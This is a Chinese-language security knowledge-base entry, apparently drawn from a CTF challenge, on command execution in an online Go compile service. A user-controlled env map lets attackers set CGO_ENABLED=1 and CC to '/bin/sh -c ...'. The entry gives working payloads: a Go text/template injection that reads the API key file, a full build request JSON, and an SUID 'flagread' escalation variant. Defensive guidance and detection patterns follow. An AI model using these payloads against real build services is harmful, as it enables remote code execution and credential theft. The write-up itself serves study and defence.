---
id: web-golang-build-env-cc-injection-command-exec
title: Go 编译服务环境变量注入：用户可控 env 覆盖 CC，cgo 构建期以 shell 执行任意命令
type: scenario
domain: web
path: web/golang
technique: go-build-env-cc-injection
aliases:
- Go build 环境变量注入
- CC 环境变量注入
- CGO_ENABLED
- go build RCE
- 编译服务命令执行
- VIP 挑战
tags:
- go
- golang
- cgo
- build-service
- environment-injection
- command-execution
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V196
  verified_at: '2026-11-06T22:48:29+08:00'
  notes: 已对照原文与VIP题截图核对：BuildRequest env 追加 cmd.Env、CGO_ENABLED=1+CC=/bin/sh -c、CombinedOutput stderr 回显、/api 模板读 /app/secret_key.txt 与 /proc/sys/kernel/osrelease、SUID flagread 延伸均与原文一致；无 affected_versions（CTF 应用无产品版本）；无 sources 字段；未复跑
---

## 一句话结论

在线 Go 编译服务把请求 JSON 里的 `env` 原样追加到 `go build` 的 `cmd.Env`，攻击者设置 `CGO_ENABLED=1` 与 `CC=/bin/sh -c "<命令> >&2; false"`，构建时 Go 调用该 C 编译器命令，shell 便在构建机执行任意命令；`false` 让构建失败，编译错误的 stderr 回显命令输出。

## 原理

- **构建环境可控**：示例服务 `POST /vip/build` 接收 `{env: map[string]string, code: string}`，把 `env` 逐项拼成 `K=V` 追加到 `cmd.Env = append(os.Environ(), envs...)`，没有对变量名做白名单。
- **cgo 会调用系统 C 编译器**：源码包含 `import "C"` 且 `CGO_ENABLED=1` 时，`go build` 需要调用 `$CC`（默认 gcc/clang）编译 C 部分。`CC` 可由环境变量指定，Go 构建系统会按该值执行编译器命令。
- **CC 即命令注入点**：把 `CC` 设为 `/bin/sh -c "ls -al / >&2; false"`，Go 执行 `CC` 时实际启动 `/bin/sh -c ...`；shell 执行 `ls -al /` 并把结果写到 stderr，`false` 返回非零让编译失败。
- **错误回显**：handler 在 `cmd.CombinedOutput()` 出错时把 `details: string(output)` 返回给请求方；由于 stderr 被合并进 output，命令输出直接出现在 JSON 响应里，形成回显型 RCE。
- **前置条件**：`/vip/build` 由 `X-API-Key` 保护，但同一服务的 `/api?template=` 使用 `text/template` 且把 `Utils`（含 `GetReader`/`ReadAll`）与 `Getenv` 暴露给模板；攻击者用 `{{.Utils.ReadAll (.Utils.GetReader "/app/secret_key.txt")}}` 读取 API Key（也可读 `/proc/self/environ`、`/proc/sys/kernel/osrelease` 确认环境与架构）。
- **为什么不是普通模板注入**：模板本身只暴露文件读取助手，不能直接执行命令；真正的 RCE 在“用户可控构建环境 → CC → shell”这条链上，模板注入只是窃取 API Key 的前置。
- **提权延伸**：构建机上有 SUID 程序 `/usr/local/bin/flagread` 时，把 CC 改为 `/bin/sh -c "/usr/local/bin/flagread >&2; false"`，即可借构建进程执行 SUID 程序读取 flag/敏感文件。

## 触发条件

- 目标提供在线 Go 编译/构建接口，请求可控制构建环境变量（至少 `CGO_ENABLED` 与 `CC`）。
- 构建环境有可用的 C 编译器/shell，且 `go build` 以服务进程权限运行。
- 攻击者能获得调用构建接口所需的凭据（如通过同服务的模板注入/文件读取泄露 API Key）。
- 构建错误信息会回传给请求方（`CombinedOutput`、stderr 合并），否则只能盲打/外带。
- 构建机存在有价值的目标（源码、密钥、SUID 程序、可写目录）。

## 利用步骤

1. 访问模板接口，读取 `/app/secret_key.txt` 或 `/proc/self/environ` 获取 API Key。
2. 读取 `/proc/sys/kernel/osrelease` 确认构建机架构（如 `6.1.0-17-amd64`），决定 `GOARCH=amd64`。
3. 构造带 `import "C"` 的 Go 源码，确保 cgo 生效。
4. 向 `/vip/build` 提交 JSON，设置 `CGO_ENABLED=1`、`CC=/bin/sh -c "<命令> >&2; false"`，触发构建。
5. 从响应的 `details` 读取命令输出；把命令换成 `find / -perm -4000` 找 SUID，再执行目标程序。
6. 授权测试只执行 `id`/`ls` 等无害命令并清理构建产物。

## PoC

读取 API Key：

```text
{{.Utils.ReadAll (.Utils.GetReader "/app/secret_key.txt")}}
```

构建请求（原文核心载荷）：

```json
{
  "env": {
    "GOOS": "linux",
    "GOARCH": "amd64",
    "CGO_ENABLED": "1",
    "CC": "/bin/sh -c \"ls -al / >&2; false\"",
    "GOGCCFLAGS": ""
  },
  "code": "package main\n\n// #include <stdio.h>\n// #include <stdlib.h>\n//\n// static void myprint(char* s) {\n//   printf(\"%s\\n\", s);\n// }\nimport \"C\"\nimport \"unsafe\"\n\nfunc main() {\n    cs := C.CString(\"Hello from stdio\")\n    C.myprint(cs)\n    C.free(unsafe.Pointer(cs))\n}"
}
```

响应中的命令输出：

```json
{
  "details": "# runtime/cgo\ntotal 76\ndrwxr-xr-x   1 root root 4096 ...\n...",
  "error": "编译失败",
  "reason": "exit status 1"
}
```

提权变体：

```json
"CC": "/bin/sh -c \"/usr/local/bin/flagread >&2; false\""
```

## 变体与关联

- 可注入的构建变量不止 `CC`：`CXX`、`GOFLAGS`、`GOCACHE`、`GOPATH`、`GOTOOLCHAIN` 等都可能影响构建行为；`CC` 最直接。
- 无回显时可把命令输出写入构建产物/外带 URL；`false` 用于强制失败并触发错误回显。
- 同类“构建服务可控环境”问题也出现在 npm（`npm_config_*`、`scripts`）、Maven/Gradle、Makefile 等。
- 关联：[[web-golang-cgo-polyglot-compile-time-file-read]]（同一 cgo 构建面的编译期文件读取，sink 不同）。
- 关联：[[web-golang-ollama-template-param-go-ssti-data-leak]]（Go text/template 注入的信息泄露）。

## 检测与防御

- 构建环境变量使用白名单（仅允许 `GOOS`/`GOARCH` 等），禁止用户设置 `CC`/`CXX`/`GOFLAGS`/`GOCACHE`/`GOPATH`。
- 在无密钥、无 SUID、低权限的临时容器/沙箱中构建；构建进程禁止访问宿主敏感路径。
- 不要向调用方回传完整编译 stderr（或先脱敏），避免命令输出回显。
- 模板不要暴露 `GetReader`/`ReadAll`/`Getenv` 等助手；使用 `html/template` 并对模板输入做白名单。
- 监控构建请求中的 `CC`/`CXX` 含 `sh -c`、`;`、`>&2` 等特征，以及构建进程派生的异常子进程。
